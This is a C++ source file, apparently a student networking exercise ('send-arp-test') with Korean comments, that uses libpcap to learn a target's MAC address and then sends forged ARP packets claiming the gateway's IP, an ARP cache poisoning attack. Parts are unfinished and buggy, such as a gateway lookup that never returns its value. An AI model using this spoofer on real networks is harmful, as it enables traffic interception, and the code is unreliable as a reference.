#include <cstdio>
#include <pcap.h>
#include <libnet.h>
#include <pthread.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>

// 기존의 libnet_arp_hdr 구조체를 사용
struct ExtendedArpHdr :public libnet_arp_hdr{
    uint8_t ar_sha[ETHER_ADDR_LEN];        // Sender hardware address
    uint8_t ar_sip[4];      // Sender protocol address
    uint8_t ar_tha[ETHER_ADDR_LEN];        // Target hardware address
    uint8_t ar_tip[4];       // Target protocol address
};

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

void find_sender_mac(const char* dev, char* sender_mac) {
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    if (fd < 0) {
        perror("socket");
        return;
    }

    strcpy(s.ifr_name, dev);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
        snprintf(sender_mac, 20, "%02x:%02x:%02x:%02x:%02x:%02x",
                 (unsigned char) s.ifr_addr.sa_data[0],
                 (unsigned char) s.ifr_addr.sa_data[1],
                 (unsigned char) s.ifr_addr.sa_data[2],
                 (unsigned char) s.ifr_addr.sa_data[3],
                 (unsigned char) s.ifr_addr.sa_data[4],
                 (unsigned char) s.ifr_addr.sa_data[5]);
    } else {
        perror("ioctl");
    }

    close(fd);
}

void find_gateway_ip(char* dev, char* hex_gateway_ip){
	FILE* fp=NULL;
	char buff[100];
	uint8_t* temp_gateway_ip[4];
	fp = fopen("/proc/net/route", "r");
    if (fp == NULL) {
        perror("fopen");
        return;
    }
	while(fgets(buff, sizeof(buff), fp)!=0){
		char current_iface[16], destination[16], gateway[16];
        sscanf(buff, "%s %s %s", current_iface, destination, gateway);

        // Iface가 'wlan0'이고 Destination 필드가 '00000000'인 경우 찾음
        if (strcmp(current_iface, dev) == 0 && strcmp(destination, "00000000") == 0) {
            //snprintf(gateway_ip, 16, "%s", gateway);
            break;  // 기본 게이트웨이를 찾은 후 루프 종료
        }
	}


	fclose(fp);

}

//void make_send_packet(EthArpPacket &packet_send, const char* sender_ip, const char* target_ip, const char* sender_mac){
void make_send_packet(EthArpPacket &packet_send, const char* sender_ip, const char* target_ip, const char* sender_mac){
	//char* new_target_mac;
	packet_send.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");//i dont know
	packet_send.eth_.smac_ = Mac(sender_mac);//sender macc
	packet_send.eth_.type_ = htons(EthHdr::Arp);
	packet_send.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet_send.arp_.pro_ = htons(EthHdr::Ip4);
	packet_send.arp_.hln_ = Mac::SIZE;
	packet_send.arp_.pln_ = Ip::SIZE;
	packet_send.arp_.op_ = htons(ArpHdr::Request);
	packet_send.arp_.smac_ = Mac(sender_mac); //sender mac
	packet_send.arp_.sip_ = htonl(Ip(sender_ip)); //sender IP
	packet_send.arp_.tmac_ = Mac("00:00:00:00:00:00"); //i dont know
	packet_send.arp_.tip_ = htonl(Ip(target_ip));//target IP
}

void change_target_arp_table(
		EthArpPacket &packet_send, 
		const char* gateway_ip, 
		const char* sender_mac, 
		const char *target_mac
	){
	//packet_send.eth_.dmac_ = Mac(target_mac);//target_mac
	packet_send.arp_.smac_ = Mac(sender_mac); //sender mac
	packet_send.arp_.sip_ = htonl(Ip(gateway_ip)); //gateway IP
	//packet_send.arp_.tmac_ = Mac(target_mac); //target mac
}

void format_mac_address(const uint8_t* mac_addr, char* target_mac) {
    snprintf(target_mac, 18, "%02x:%02x:%02x:%02x:%02x:%02x",
             mac_addr[0], mac_addr[1], mac_addr[2],
             mac_addr[3], mac_addr[4], mac_addr[5]);
}

int main(int argc, char* argv[]) {
	if (argc != 2) {
		usage();
		return -1;
	}
	//const u_char* packet_send;
	char* dev = argv[1];
	//char* sender_ip = argv[2];
	//char* target_ip = argv[3];
	//printf("sender_ip: %s, target_ip: %s\n", argv[2], argv[3]);

	const char* sender_ip="192.168.182.110";
	const char* target_ip="192.168.182.183";
	//const char* gateway_ip="192.168.182.172";//gateway_ip = target_ip use!!!
	char gateway_ip[18];
	find_gateway_ip(dev, gateway_ip);
	printf("gateway_mac: %s\n", gateway_ip);
	char sender_mac[18] = {0};
	find_sender_mac(dev, sender_mac);
	printf("sender_mac: %s\n", sender_mac);

	char target_mac[18] = {0};
	
	int flag_send=1;
	//flag_send
	//1: find target mac
	//2: find gateway ip
	//3: find gateway mac
	//4: send arp table attack
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle_send = pcap_open_live(dev, 0,0,0, errbuf);
	if (handle_send == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	pcap_t* handle_receive = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle_receive == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket packet_send;


	while (1) {
		if(flag_send){
			if(flag_send==1){
				make_send_packet(packet_send, sender_ip, target_ip, sender_mac);
			}
			else if(flag_send==2){
				printf("Attack!!\n");
				change_target_arp_table(packet_send, gateway_ip, sender_mac, target_mac);
			}
			//change_target_arp_table(packet_send, gateway_ip, sender_mac, target_mac);
	
			
			int res = pcap_sendpacket(handle_send, reinterpret_cast<const u_char*>(&packet_send), sizeof(EthArpPacket));
			if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle_send));
			}
			flag_send=0;
		}

		struct pcap_pkthdr* header;
		int res;
		const u_char* packet_receive;
		res = pcap_next_ex(handle_receive, &header, &packet_receive);
		if (res == 0) continue; 
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle_receive));
			break;
		}
		//printf("arp hdr size: %d\n", sizeof(struct libnet_arp_hdr));//8

		printf("%u bytes captured\n", header->caplen);
		
		struct libnet_ethernet_hdr* ethernet_hdr = (struct libnet_ethernet_hdr*)packet_receive;
		
		    //ether_type=ARP 
        if (ntohs(ethernet_hdr->ether_type) == 0x806) {
            //struct libnet_arp_hdr* arp_hdr = (struct libnet_arp_hdr*)(packet + sizeof(struct libnet_ethernet_hdr));
            struct ExtendedArpHdr* arp_hdr = (struct ExtendedArpHdr*)(packet_receive+ sizeof(struct libnet_ethernet_hdr));

            if (ntohs(arp_hdr->ar_op) ==2) {//check ip too
				uint8_t *reply_sender_mac = arp_hdr->ar_sha;
				format_mac_address(reply_sender_mac, target_mac);
    			printf("Target MAC Address: %s\n", target_mac);
				flag_send=2;
            }
		}
	}

	pcap_close(handle_send);
	pcap_close(handle_receive);
	//pcap_close(pcap_receiver);
}
